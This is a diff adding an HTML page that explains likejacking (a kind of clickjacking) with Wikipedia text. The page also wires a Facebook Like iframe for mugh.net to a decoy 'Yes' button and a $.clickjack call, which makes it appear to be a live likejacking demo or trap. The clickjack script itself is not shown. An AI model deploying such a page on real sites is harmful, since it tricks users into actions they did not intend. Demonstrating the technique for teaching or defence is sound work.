@@ -1,0 +1,45 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>Likejacking</title>
+    <link href="css/style.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+    <form id="frmClickJack" runat="server">
+    <div>
+        <h4>
+            What is Likejacking?</h4>
+        <p>
+            Likejacking, a form of clickjacking, is a malicious technique of tricking users
+            of a website into posting a Facebook status update for a site they did not intentionally
+            mean to "like".[1] The initial concept and code for likejacking were created by
+            a Black Hat World user that goes by the handle izSpK.[citation needed]</p>
+        <p>
+            The term "likejacking" came from a comment posted by Corey Ballou[2] in the article
+            How to "Like" Anything on the Web (Safely), which is one of the first documented
+            postings explaining the possibility of malicious activity regarding Facebook's "like"
+            button.[3]
+        </p>
+        <div>
+            <label>
+                Is this article useful?</label>
+            <span>
+                <input type="button" value="Yes" /></span> <span>
+                <input type="button" value="No" disabled="disabled" />
+            </span>
+        </div>
+    </div>
+    <br />
+    <iframe src="//www.facebook.com/plugins/like.php?href=http%3A%2F%2Fmugh.net&amp;send=false&amp;layout=standard&amp;width=100&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font&amp;height=35" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:100px; height:35px;" allowTransparency="true"></iframe>
+    <br /><br />
+    <div>Source: WikiPedia</div>
+    </form>
+    <script src="js/jquery-1.6.4.min.js" type="text/javascript"></script>
+    <script src="js/clickjack.js" type="text/javascript"></script>
+    <script language="javascript">
+        $(document).ready(function () {
+            $.clickjack({ src: 'fb' });
+        });
+    </script>
+</body>
+</html>
